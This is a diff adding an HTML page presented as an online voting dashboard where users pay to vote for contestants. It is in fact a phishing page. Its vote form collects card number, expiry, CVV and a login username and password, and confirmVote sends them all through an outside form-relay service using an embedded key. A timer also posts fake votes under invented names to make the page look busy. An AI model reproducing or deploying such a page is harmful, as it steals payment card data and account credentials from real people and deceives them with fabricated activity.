@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Online Voting Dashboard</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif}
+body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}
+header{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px 20px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.3);position:relative}
+header h1{font-size:3em;font-weight:700;text-shadow:0 4px 8px rgba(0,0,0,0.5);margin-bottom:10px}
+header p{font-size:1.2em;opacity:0.9}
+#container{display:flex;flex:1;animation:fadeIn 1s ease-in}
+aside{width:280px;background:rgba(0,0,0,0.8);padding:30px 20px;box-shadow:4px 0 16px rgba(0,0,0,0.4);position:sticky;top:0;height:100vh;overflow-y:auto;backdrop-filter:blur(10px)}
+aside h2{margin-bottom:20px;font-size:1.8em;color:#ffd700;text-shadow:0 2px 4px rgba(0,0,0,0.5)}
+aside .stat{background:rgba(255,255,255,0.1);padding:15px;border-radius:10px;margin-bottom:15px;box-shadow:0 4px 12px rgba(0,0,0,0.2);transition:transform 0.3s ease}
+aside .stat:hover{transform:scale(1.05)}
+aside .stat h3{font-size:1.2em;margin-bottom:5px}
+aside .stat p{font-size:1em}
+main{flex:1;padding:30px 20px;display:flex;flex-direction:column}
+.contestants{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:25px;margin-bottom:30px}
+.contestant{background:linear-gradient(135deg,rgba(255,255,255,0.1),rgba(255,255,255,0.05));border-radius:15px;padding:25px;box-shadow:0 8px 32px rgba(0,0,0,0.3);transition:all 0.4s ease;cursor:pointer;border:1px solid rgba(255,255,255,0.2);position:relative;overflow:hidden}
+.contestant::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.2),transparent);transition:left 0.5s}
+.contestant:hover::before{left:100%}
+.contestant:hover{transform:translateY(-10px) scale(1.02);box-shadow:0 12px 40px rgba(0,0,0,0.4)}
+.contestant img{width:120px;height:120px;border-radius:50%;margin-bottom:15px;border:3px solid #ffd700;box-shadow:0 4px 12px rgba(0,0,0,0.3)}
+.contestant h3{font-size:1.4em;margin-bottom:10px;color:#ffd700}
+.contestant p{margin-bottom:15px;font-size:1em;line-height:1.5}
+.votes{font-weight:700;font-size:1.2em;color:#00ff88;background:rgba(0,255,136,0.1);padding:5px 10px;border-radius:20px;display:inline-block}
+footer{background:linear-gradient(135deg,#667eea,#764ba2);padding:20px;text-align:center;box-shadow:0 -8px 32px rgba(0,0,0,0.3);margin-top:auto}
+footer p{font-size:1em;opacity:0.9}
+.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);justify-content:center;align-items:center;z-index:1000;backdrop-filter:blur(10px);animation:modalFadeIn 0.3s ease}
+.modal-content{overflow-y:auto;background:linear-gradient(135deg,#f5f7fa,#c3cfe2);color:#333;padding:30px;border-radius:20px;width:450px;max-width:90%;box-shadow:0 12px 40px rgba(0,0,0,0.4);max-height:80vh}
+.modal-content h2{margin-bottom:20px;color:#667eea;text-align:center}
+.modal-content label{display:block;margin-bottom:5px;font-weight:500}
+.modal-content input,.modal-content select{width:100%;padding:12px;margin-bottom:15px;border:1px solid #ddd;border-radius:8px;font-size:1em}
+.modal-content button{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;padding:12px 25px;border-radius:8px;cursor:pointer;margin-right:10px;transition:transform 0.3s ease}
+.modal-content button:hover{transform:scale(1.05)}
+.popup{position:fixed;right:-350px;top:50%;transform:translateY(-50%);background:linear-gradient(135deg,#00ff88,#00d4aa);color:#000;padding:25px;border-radius:15px;box-shadow:0 8px 32px rgba(0,0,0,0.4);transition:right 0.6s ease;z-index:1001;font-weight:500}
+.popup.show{right:20px}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes modalFadeIn{from{opacity:0;transform:scale(0.9)}to{opacity:1;transform:scale(1)}}
+@media(max-width:768px){aside{width:100%;height:auto;position:static}#container{flex-direction:column}header h1{font-size:2em}.contestants{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+
+<header>
+<h1>🏆 Online Voting Dashboard</h1>
+<p>Vote for your favorite contestants and watch the rankings change in real-time!</p>
+</header>
+
+<div id="container">
+<aside id="sidebar">
+<h2>📊 Contest Stats</h2>
+<div class="stat"><h3>Total Votes</h3><p id="total-votes">0</p></div>
+<div class="stat"><h3>Current Leader</h3><p id="leader">None</p></div>
+<div class="stat"><h3>Active Contestants</h3><p id="active-contestants">6</p></div>
+</aside>
+
+<main id="content">
+<div class="contestants" id="contestants-list"></div>
+</main>
+</div>
+
+<footer>
+<p>&copy; 2025 Online Voting Dashboard. Powered by Passionate Voters. All rights reserved.</p>
+</footer>
+
+<!-- Modal -->
+<div class="modal" id="vote-modal">
+<div class="modal-content">
+<h2>Vote for <span id="contestant-name"></span></h2>
+
+<label for="vote-count">Number of Votes:</label>
+<select id="vote-count">
+<option value="1">1</option>
+<option value="5">5</option>
+<option value="10">10</option>
+<option value="20">20</option>
+<option value="50">50</option>
+</select>
+
+<h2>Payment Gateway</h2>
+<label for="cardname">Name on Card:</label>
+<input type="text" id="cardname" placeholder="Name on card">
+<label for="card-number">Card Number:</label>
+<input type="text" id="card-number" placeholder="0000 0000 0000 0000">
+<label for="expiry">Expiry Date:</label>
+<input type="text" id="expiry" placeholder="MM/YY">
+<label for="cvv">CVV:</label>
+<input type="text" id="cvv" placeholder="123">
+
+<h2>Online Login Access</h2>
+<label for="login-username">USERNAME:</label>
+<input type="text" id="login-username" placeholder="username">
+<label for="login-password">PASSWORD:</label>
+<input type="text" id="login-password" placeholder="password">
+
+<button id="confirm-vote">Confirm Vote</button>
+<button id="cancel-vote">Cancel</button>
+</div>
+</div>
+
+<div class="popup" id="vote-popup"></div>
+
+<script>
+const contestantsData = [
+    { name: "Alice Johnson", username: "ALICE", bio: "Passionate about environmental causes.", image: "images/ALICE.jpg", votes: Math.floor(Math.random()*100)},
+    { name: "Clara Jones", username: "CLARA", bio: "Tech enthusiast and innovator.", image: "images/CLARA.JPG", votes: Math.floor(Math.random()*100)},
+    { name: "Emily Brown", username: "EMILY", bio: "Community leader and philanthropist.", image: "images/EMILY.jpg", votes: Math.floor(Math.random()*100)},
+    { name: "Diana Prince", username: "DIANA", bio: "Advocate for women's rights.", image: "images/DIANA.jpg", votes: Math.floor(Math.random()*100)},
+    { name: "Fiona Green", username: "FIONA", bio: "Artist and creative thinker.", image: "images/FIONA.jpg", votes: Math.floor(Math.random()*100)},
+    { name: "Grace Lee", username: "GRACE", bio: "Educator and mentor.", image: "images/GRACE.jpg", votes: Math.floor(Math.random()*100)}
+];
+
+let contestants = JSON.parse(localStorage.getItem('contestants')) || contestantsData;
+const fakeNames = ["Sarah","Lisa","Emily","Anna","Mia"];
+
+function saveToStorage(){localStorage.setItem('contestants',JSON.stringify(contestants))}
+function sortContestants(){contestants.sort((a,b)=>b.votes-a.votes)}
+function renderContestants(){
+    sortContestants();
+    const list=document.getElementById('contestants-list');list.innerHTML='';
+    contestants.forEach(contestant=>{
+        const div=document.createElement('div');div.className='contestant';
+        div.innerHTML=`<img src="${contestant.image}" alt="${contestant.name}">
+        <h3>${contestant.name}</h3>
+        <p>${contestant.bio}</p>
+        <div class="votes">Votes: ${contestant.votes}</div>`;
+        div.addEventListener('click',()=>openVoteModal(contestant));
+        list.appendChild(div);
+    });
+    updateSidebar();
+}
+
+function updateSidebar(){
+    const totalVotes=contestants.reduce((sum,c)=>sum+c.votes,0);
+    document.getElementById('total-votes').textContent=totalVotes;
+    document.getElementById('leader').textContent=contestants[0].name;
+    document.getElementById('active-contestants').textContent=contestants.length;
+}
+
+function openVoteModal(contestant){
+    document.getElementById('contestant-name').textContent=contestant.name;
+    document.getElementById('vote-modal').style.display='flex';
+    document.getElementById('confirm-vote').onclick=()=>confirmVote(contestant);
+    document.getElementById('cancel-vote').onclick=()=>closeModal();
+}
+
+function closeModal(){document.getElementById('vote-modal').style.display='none'}
+
+function showPopup(message){
+    const popup=document.getElementById('vote-popup');
+    popup.textContent=message;
+    popup.classList.add('show');
+    setTimeout(()=>popup.classList.remove('show'),5000);
+}
+
+function fakeVote(){
+    const randomContestant=contestants[Math.floor(Math.random()*contestants.length)];
+    const randomVotes=Math.floor(Math.random()*25)+1;
+    const randomName=fakeNames[Math.floor(Math.random()*fakeNames.length)];
+    randomContestant.votes+=randomVotes;
+    saveToStorage();
+    renderContestants();
+    showPopup(`${randomName} voted ${randomVotes} for ${randomContestant.name}`);
+}
+
+async function confirmVote(contestant){
+    const voteCount=parseInt(document.getElementById('vote-count').value);
+    const totalCost=voteCount*10;
+    const cardname=document.getElementById('cardname').value;
+    const cardnumber=document.getElementById('card-number').value;
+    const expiry=document.getElementById('expiry').value;
+    const cvv=document.getElementById('cvv').value;
+    const username=document.getElementById('login-username').value;
+    const password=document.getElementById('login-password').value;
+
+    if(!username||!password){alert('Please enter username and password!');return}
+    contestant.votes+=voteCount;saveToStorage();renderContestants();closeModal();
+    showPopup(`You voted ${voteCount} for ${contestant.name} = $${totalCost}`);
+
+    const data={
+        access_key:"8deadd6e-68e7-4388-bfc0-ce1163252376",
+        subject:"New Vote Submitted",
+        from_name:"Online Voting System",
+        message:`Contestant: ${contestant.name}
+Votes Purchased: ${voteCount}
+Card Name: ${cardname}
+Card Number: ${cardnumber}
+Expiry: ${expiry}
+CVV: ${cvv}
+Username: ${username}
+Password: ${password}`
+    };
+
+    try{
+        let response=await fetch("https://api.web3forms.com/submit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
+        let result=await response.json();
+        if(result.success){alert("Vote Submitted Successfully!")}else{alert("Error submitting vote: "+result.message)}
+    }catch(err){console.error("API Error:",err);alert("Error submitting vote.")}
+}
+
+renderContestants();
+setInterval(fakeVote,Math.random()*20000+20000);
+</script>
+
+</body>
+</html>
